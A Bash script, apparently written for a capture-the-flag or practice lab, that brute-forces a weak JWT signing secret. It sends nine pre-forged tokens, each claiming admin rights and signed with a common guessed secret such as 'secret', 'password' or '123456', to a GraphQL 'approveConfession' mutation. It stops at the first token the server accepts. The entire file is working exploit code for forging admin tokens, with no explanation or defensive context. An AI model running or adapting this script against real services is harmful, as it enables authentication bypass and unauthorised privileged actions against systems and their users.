#!/bin/bash

# Array de tokens con sus secretos
declare -A tokens
tokens["secret"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.yU9Ps_Uk29jCsCn5_ZspQ11rUOglua81-Wu47h5--U8"
tokens["Secret"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.oBtOiVCDz1jecdOeTkK8SEtjOocNymNhw7sTnCwZqW8"
tokens["SECRET"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.UzIXF515w_tZ1oEpeq7kpsHpCC0wviQxBFDWJvuDoaQ"
tokens["password"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.qDPWwHW7pPFvl-x1yT3vcC8d9uquzmY8EdlODPDF6v8"
tokens["123456"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.Hj8IzPN0WxznmWWyorC1RLqA6sXtTMIEe0dzkghBx9Y"
tokens["admin"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.zne33NmKwNjryvCC3BLtSemg24NmEz5kYhxNtyfhzbk"
tokens["key"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.lkw70SEGEentIOG6HGm2aN4v9qEsE2mKDYBCimohJoE"
tokens["graphql"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.M_7jJo0o4lNaFCBJMJkJEqwxHCCbPdX_MjC7TM7HGVM"
tokens["confession"]="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NjQzODAxfQ.k6_g3GKOYmQqCQXfBTn4C3FWP-6p4zOCLfqGCJKkk-8"

for secret in "${!tokens[@]}"; do
    echo "Testing secret: $secret"
    TOKEN="${tokens[$secret]}"
    
    response=$(curl -s -X POST http://hackme3.vulnmachines.com:7800/graphql \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"mutation { approveConfession(token: \\\"$TOKEN\\\", confessionId: 25) { confession { id content isApproved } message } }\"}")
    
    if [[ ! "$response" =~ "Invalid token" ]]; then
        echo "SUCCESS with secret: $secret"
        echo "Response: $response"
        break
    fi
done